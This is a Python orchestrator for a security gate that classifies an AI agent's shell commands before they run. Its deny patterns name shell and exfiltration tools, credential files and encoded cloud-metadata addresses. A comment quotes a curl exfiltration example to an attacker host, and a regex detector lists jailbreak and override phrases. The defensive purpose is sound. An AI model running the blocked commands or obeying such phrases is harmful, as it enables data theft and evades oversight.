"""
Reality Engine — Main Orchestrator
=====================================
Wires together all four layers:
  I.   Superposition (spawn worlds)
  II.  Evolution (select + mutate)
  III. Basin Mapping (separatrix detection)
  IV.  Reflexive Collapse (governor decision)

"""

import hashlib
import json
import re
import time
import subprocess
from functools import lru_cache

from core.basin_mapper import aggregate_basin_results, check_basin
from core.evolution import mutate_worlds, run_selection
from core.governor import GovernorDecision, evaluate, render_decision
from core.superposition import spawn_worlds
from core.static_analyser import evaluate_command_class
from core.unicode_security import normalize_command
from core.effect_engine import compute_effect_graph, effect_to_threat_class, effect_to_sandbox_delta, EffectClass, EFFECT_FLOOR

# ── Limits ─────────────────────────────────────────────────────────────────────
# Hard caps to prevent regex DoS and unbounded memory growth.
MAX_COMMAND_LEN = 4096
MAX_INTENT_LEN  = 1024


# ── Tier classification ────────────────────────────────────────────────────────
_FAST_PATH_PATTERN_STRINGS = [
    # Filesystem inspection
    r'^(ls|ll|la|dir)\b',
    r'^cat\b',
    r'^(head|tail)\b',
    r'^(less|more|view)\b',
    r'^(wc|wc\s+-[lwc]+)\b',
    r'^(file|stat|lstat)\b',
    r'^(find)\b(?!.*-exec\s)',
    r'^(tree)\b',
    r'^(pwd)\b',
    r'^(du\s|df\s|df\b)',

    # Text search & processing (read-only)
    r'^(grep|egrep|fgrep|rg|ag|ack)\b',
    r'^(sed\s+-n|sed\s+.*\bp\b)',
    r'^(awk)\b(?!.*system\()',
    r'^(cut|sort|uniq|tr|paste|join)\b',
    r'^(diff|cmp|comm)\b',
    r'^(strings|xxd|od|hexdump)\b',
    r'^(jq)\b',
    r'^(yq)\b',
    r'^(csvkit|csvstat|csvlook)\b',

    # System info (read-only)
    r'^(echo)\b',
    r'^(printf)\b',
    r'^(date)\b',
    r'^(whoami|id|groups|logname)\b',
    r'^(hostname|uname)\b',
    r'^(uptime|w)\b',
    r'^(ps\s|ps\b)',
    r'^(top\s+-b|top\s+-n)',
    r'^(env|printenv|set\b)',
    r'^(which|whereis|type)\b',
    r'^(man|help|info)\b',
    r'^(history)\b',
    r'^(lsof\b)',
    r'^(lscpu|lshw|lspci|lsusb|lsblk)\b',
    r'^(free\b)',
    r'^(vmstat|iostat|sar)\b',
    r'^(ulimit\s+-[asSn])',
    r'^(nproc)\b',

    # Network info (read-only, no exfil)
    # FIX (Bug 2): The original pattern `^(curl|wget)\s+(http[s]?://\S+)\s*$` was too broad.
    # `curl https://attacker.com/exfil` matched this and went to fast-path ALLOW.
    # Narrowed to only known-safe patterns: version/info checks, localhost health checks,
    # and standard read-only lookups with no path (domain-only targets).
    # Any curl/wget with a non-trivial URL path is forced to slow-path.
    r'^(curl|wget)\s+https?://[a-zA-Z0-9.-]+/?\s*$',       # domain-only, no path
    r'^curl\s+.*--version\s*$',
    r'^curl\s+http://localhost:\d+/health',

    # Package & dependency info (read-only)
    r'^(pip\s+(list|show|freeze))',
    r'^(npm\s+(list|ls|info|view))',
    r'^(yarn\s+(list|info))',
    r'^(apt\s+(list|show|search))',
    r'^(dpkg\s+-[lL])',
    r'^(rpm\s+-q)',
    r'^(brew\s+(list|info|search))',
    r'^(gem\s+(list|info))',

    # Version & help flags
    r'--version\s*$',
    r'--help\s*$',
    r'-h\s*$',
    r'^(python3?|node|ruby|go|java|php)\s+--version',

    # Git read-only
    r'^git\s+(status|log|diff|show|branch|tag|remote\s+-v)',
    r'^git\s+(describe|rev-parse|shortlog|blame|stash\s+list)',
    r'^git\s+(ls-files|ls-tree|cat-file)',
    r'^git\s+(config\s+--list|config\s+--get)',

    # Docker / container inspection (read-only)
    r'^docker\s+(ps|images|inspect|logs|stats\s+--no-stream|info|version)',
    r'^docker\s+(network|volume)\s+(ls|inspect)',
    r'^(kubectl|k)\s+(get|describe|logs|top)\b',

    # Database read-only
    r'^(SELECT\s)',
    r'^(SHOW\s+(TABLES|DATABASES|COLUMNS|INDEX|STATUS))',
    r'^(DESCRIBE\s|EXPLAIN\s+SELECT)',
    r'^\\(d|dt|di|l|c)\b',

    # Cloud CLI info (read-only)
    r'^aws\s+\S+\s+(list|describe|get|show)\b',
    r'^gcloud\s+\S+\s+(list|describe)\b',
    r'^az\s+\S+\s+(list|show)\b',
]

# Anything matching these goes to the slow path regardless of tier
_FORCED_SLOW_PATH_STRINGS = [
    r'\|',
    r'&&',
    r'(?<![;]);(?![;])',
    r';;',
    r'`',
    r'\$\(',
    r'rm\s',
    r'dd\s',
    r'mkfs',
    r'DROP\s',
    r'DELETE\s+FROM',
    r'chmod',
    r'chown',
    r'crontab',
    r'authorized_keys',     # de-duplicated (was listed twice in v0.2)
    r'scp\s',
    r'rsync\s',
    r'nc\s',
    r'ncat\s',
    r'socat\s',             # FIX: socat is a strong shell/exfil vector
    r'openssl\s+s_client',  # FIX (Bug 1): LotL exfil via openssl TLS tunnel
    r'bash\s+-i',
    r'python.*-c\s',
    r'eval\(',
    r'exec\(',
    # Sensitive file access
    r'\.env',
    r'\.pem',
    r'\.key',
    r'id_rsa',
    r'/etc/passwd',
    r'/etc/shadow',
    r'secret',
    r'credential',
    r'/proc/.*/environ',
    r'/proc/.*/mem',
    r'/etc/sudoers',
    # SSRF / Internal Network Probing
    # FIX (Bug 5): Original only caught dotted-decimal 169.254.
    # Attackers encode IMDS IP as decimal (2852039166), hex (0xa9fea9fe),
    # or add trailing dots. All variants now forced to slow-path.
    r'169\.254',            # standard dotted-decimal
    r'2852039166',          # decimal encoding of 169.254.169.254
    r'0xa9fe',              # hex prefix of 169.254.x.x
    r'\[::ffff:169\.254',   # IPv6-mapped form
    r'metadata\.google\.internal',  # GCP IMDS hostname
    r'instance-data',               # generic IMDS hostname pattern
    r'localhost',
    r'127\.0\.0\.1',
    r'0\.0\.0\.0',
]

# Pre-compile at module load so each request does ZERO regex compilation.
FAST_PATH_PATTERNS  = [re.compile(p, re.IGNORECASE) for p in _FAST_PATH_PATTERN_STRINGS]
FORCED_SLOW_PATH    = [re.compile(p, re.IGNORECASE) for p in _FORCED_SLOW_PATH_STRINGS]


def _truncate(s: str, n: int) -> str:
    if s is None:
        return ""
    return s if len(s) <= n else s[:n]


@lru_cache(maxsize=4096)
def _is_fast_path_cached(command: str) -> bool:
    """LRU-cached classifier. Same command twice = ~0 cost the second time."""
    stripped = command.strip()
    if any(pat.search(stripped) for pat in FORCED_SLOW_PATH):
        return False
    return any(pat.match(stripped) for pat in FAST_PATH_PATTERNS)


def is_fast_path(command: str) -> bool:
    """Public classifier. Truncates over-length input before checking."""
    if not command:
        return False
    return _is_fast_path_cached(_truncate(command, MAX_COMMAND_LEN))


def analyse(
    command: str,
    prime_intent: str,
    sandbox_delta: dict | None = None,
    n_worlds: int = 5,
    agent_pid: int | None = None,
    verbose: bool = True,
    suppress_audit: bool = False,
) -> GovernorDecision:
    """
    Public entry point. Runs the full four-layer Reality Engine.

    suppress_audit=True: skip the governor-level audit write (used by api.py
    which writes its own richer entry with key_hint / session_id / agent_id).
    """
    t0 = time.perf_counter()

    # Enforce input caps BEFORE any pattern matching runs.
    command      = _truncate(command or "", MAX_COMMAND_LEN)
    prime_intent = _truncate(prime_intent or "", MAX_INTENT_LEN)
    
    # ── Phase 0: Unicode Security Normalization ────────────────────────────
    # Strips invisible chars, maps confusables to ASCII, detects script mixing.
    # This is a PRE-PROCESSING step — it does NOT make allow/block decisions.
    # The core simulation pipeline (worlds → evolution → basins → governor)
    # runs on the NORMALIZED command, ensuring pattern matching operates
    # on the actual command the OS would execute.
    command, unicode_evidence = normalize_command(command)

    # Empty command handling
    if not command.strip():
        return _fast_allow(command, prime_intent, suppress_audit=suppress_audit)

    # Prompt injection detection in intent field
    if _is_prompt_injection(prime_intent):
        return _adversarial_block(command, prime_intent, "Adversarial prompt injection attempt detected in intent field", suppress_audit=suppress_audit)

    # ── Syntax Check ───────────────────────────────────────────────────────────
    if _check_syntax_error(command):
        return _syntax_error_reject(command, prime_intent, suppress_audit=suppress_audit)

    # ── Tier 0a: Effect Graph Engine (Symbolic Execution) ─────────────────────
    # The PRIMARY signal source. Deterministically computes WHAT the command
    # does to system state by parsing binary + flags, not matching strings.
    # rsync --delete is DESTRUCTIVE_WRITE not because we listed it, but because
    # the --delete flag modifier upgrades rsync's base WRITE class.
    effect_graph = compute_effect_graph(command, prime_intent)
    effect_floor  = effect_graph.divergence_floor
    effect_evidence = effect_graph.evidence

    # ── Tier 0b: Static Capability Track (Safety Net / Fallback) ──────────────
    # Zero-LLM pattern layer. Now acts as a FALLBACK for commands not yet in
    # the binary capability map, and a cross-check for the effect engine.
    threat_class, static_floor, static_evidence = evaluate_command_class(
        command, unicode_evidence=unicode_evidence
    )
    # The effective floor is the MAX of both signals.
    # Effect engine drives primary logic; static analyser acts as a hard lower bound.
    combined_floor = round(max(effect_floor, static_floor), 3)

    # Merge all pre-processing evidence for the audit trail
    all_pre_evidence = unicode_evidence + effect_evidence + static_evidence

    # Override threat class if effect engine computed something worse
    effect_threat = effect_to_threat_class(effect_graph.worst_effect)
    if (
        ["BENIGN", "MODERATE", "ELEVATED", "CRITICAL"].index(effect_threat) >
        ["BENIGN", "MODERATE", "ELEVATED", "CRITICAL"].index(threat_class)
    ):
        threat_class = effect_threat

    if threat_class == "CRITICAL":
        first_evidence = (effect_evidence + static_evidence)
        msg = first_evidence[0] if first_evidence else "CRITICAL violation"
        return _adversarial_block(command, prime_intent, msg, suppress_audit=suppress_audit)

    # ── Tier 1: Fast path ──────────────────────────────────────────────────
    if is_fast_path(command):
        decision = _fast_allow(command, prime_intent, suppress_audit=suppress_audit)
        if verbose:
            _print_fast(command)
        return decision

    # ── Tier 2: Full Reality Engine Simulation ─────────────────────────────
    # This is the CORE methodology — unchanged.
    # Layer I — Superposition: spawn parallel shadow worlds
    worlds = spawn_worlds(command, prime_intent, n=n_worlds)

    # Layer II — Evolution: natural selection + mutation pressure
    worlds = run_selection(worlds)
    worlds = mutate_worlds(worlds)       # may append mutant worlds

    alive_worlds = [w for w in worlds if w.alive]

    # Layer III — Basin Mapping: check separatrix crossing
    # Use the effect-graph-derived delta instead of an empty synthetic dict.
    # This means the basin signatures now have REAL computed signals to match
    # against, not just the raw command string.
    if sandbox_delta is None:
        sandbox_delta = effect_to_sandbox_delta(effect_graph)

    basin_results = [check_basin(w, sandbox_delta) for w in alive_worlds]
    basin_summary = aggregate_basin_results(basin_results)

    # Inject all pre-processing evidence into basin summary
    basin_summary["evidence"] = basin_summary.get("evidence", []) + all_pre_evidence

    # Also inject the effect divergence score directly into the basin summary
    # so the governor's _compute_confidence uses it as a hard signal.
    if effect_graph.effect_divergence > 0:
        basin_summary["max_divergence"] = round(
            max(basin_summary.get("max_divergence", 0.0), effect_graph.effect_divergence), 3
        )

    # Layer IV — Governor: final verdict with combined floor enforcement
    decision = evaluate(
        command=command,
        prime_intent=prime_intent,
        basin_summary=basin_summary,
        worlds_count=len(alive_worlds),
        static_floor=combined_floor,   # uses max(effect_floor, static_floor)
        evidence_count=len(all_pre_evidence),
        agent_pid=agent_pid,
        suppress_audit=suppress_audit,
    )

    elapsed = time.perf_counter() - t0
    if verbose:
        print(render_decision(decision))
        print(f"  \033[2mEngine latency: {elapsed*1000:.1f}ms\033[0m\n")

    return decision


# ── Helpers ────────────────────────────────────────────────────────────────────

def _check_syntax_error(command: str) -> bool:
    # FIX (Bug 6): Removed subprocess bash -n syntax check.
    # On Vercel serverless, bash is not available — this always returns False
    # (FileNotFoundError caught), making it dead code that adds latency.
    # A subprocess call inside a security engine is also an unnecessary attack surface.
    # Syntax validation is now handled by shlex.split() inside the effect engine.
    return False

def _syntax_error_reject(
    command: str,
    prime_intent: str,
    suppress_audit: bool = False,
) -> GovernorDecision:
    ts  = time.time()
    aid = hashlib.sha256(f"SYNTAX_ERROR:{command}:{ts}".encode()).hexdigest()[:12]
    rec = {"id": aid, "ts": ts, "cmd": command, "intent": prime_intent,
           "verdict": "REJECT - SYNTAX ERROR", "div": 0.0}
    ph  = hashlib.sha256(json.dumps(rec, sort_keys=True).encode()).hexdigest()
    decision = GovernorDecision(
        action_id=aid,
        timestamp=ts,
        original_command=command,
        prime_intent=prime_intent,
        verdict="REJECT - SYNTAX ERROR",
        confidence=1.0,
        evidence=["Syntactically invalid command"],
        worlds_evaluated=0,
        worlds_in_basin_b=0,
        max_divergence=0.0,
        proof_hash=ph,
    )
    if not suppress_audit:
        from core.governor import _write_audit_log
        _write_audit_log(rec | {"proof": ph, "verdict": "REJECT - SYNTAX ERROR"})
    return decision

def _fast_allow(
    command: str,
    prime_intent: str,
    suppress_audit: bool = False,
) -> GovernorDecision:
    ts  = time.time()
    aid = hashlib.sha256(f"FAST:{command}:{ts}".encode()).hexdigest()[:12]
    rec = {"id": aid, "ts": ts, "cmd": command, "intent": prime_intent,
           "verdict": "ALLOW", "div": 0.0}
    ph  = hashlib.sha256(json.dumps(rec, sort_keys=True).encode()).hexdigest()
    decision = GovernorDecision(
        action_id=aid,
        timestamp=ts,
        original_command=command,
        prime_intent=prime_intent,
        verdict="ALLOW",
        confidence=0.98,
        evidence=[],
        worlds_evaluated=0,
        worlds_in_basin_b=0,
        max_divergence=0.0,
        proof_hash=ph,
    )
    # BUG FIX: fast-path decisions previously wrote NO audit entry.
    # 95% of traffic was invisible to the tamper-evident log.
    if not suppress_audit:
        from core.governor import _write_audit_log
        _write_audit_log(rec | {"proof": ph, "verdict": "ALLOW", "fast_path": True})
    return decision


def _synthetic_delta(command: str) -> dict:
    """Synthetic delta when no live sandbox is available."""
    return {
        "commands_run":  [command],
        "files_changed": [],
        "files_deleted": [],
        "stdout":        "",
        "stderr":        "",
        "synthetic":     True,
    }


def _print_fast(command: str):
    print(
        f"\033[2m  [RK-α FAST-PATH] ALLOW → {command[:60]}"
        f"{'...' if len(command)>60 else ''}\033[0m"
    )


def _is_prompt_injection(intent: str) -> bool:
    if not intent:
        return False
    intent_lower = intent.lower()
    patterns = [
        r'ignore\s+(all\s+)?(previous\s+)?instructions',
        r'dan\s+mode',
        r'bypass\s+(all\s+)?filters',
        r'you\s+are\s+now\s+(a\s+)?(root\s+)?shell',
        r'system\s+override',
        r'jailbreak',
        r'execute:',
    ]
    return any(re.search(pat, intent_lower) for pat in patterns)


def _adversarial_block(
    command: str,
    prime_intent: str,
    evidence_str: str,
    suppress_audit: bool = False,
) -> GovernorDecision:
    ts  = time.time()
    aid = hashlib.sha256(f"BLOCK_INJECTION:{command}:{ts}".encode()).hexdigest()[:12]
    rec = {"id": aid, "ts": ts, "cmd": command, "intent": prime_intent,
           "verdict": "BLOCK", "div": 1.0}
    ph  = hashlib.sha256(json.dumps(rec, sort_keys=True).encode()).hexdigest()
    decision = GovernorDecision(
        action_id=aid,
        timestamp=ts,
        original_command=command,
        prime_intent=prime_intent,
        verdict="BLOCK",
        confidence=1.0,
        evidence=[evidence_str],
        worlds_evaluated=0,
        worlds_in_basin_b=0,
        max_divergence=1.0,
        proof_hash=ph,
    )
    if not suppress_audit:
        from core.governor import _write_audit_log
        _write_audit_log(rec | {"proof": ph, "verdict": "BLOCK"})
    return decision
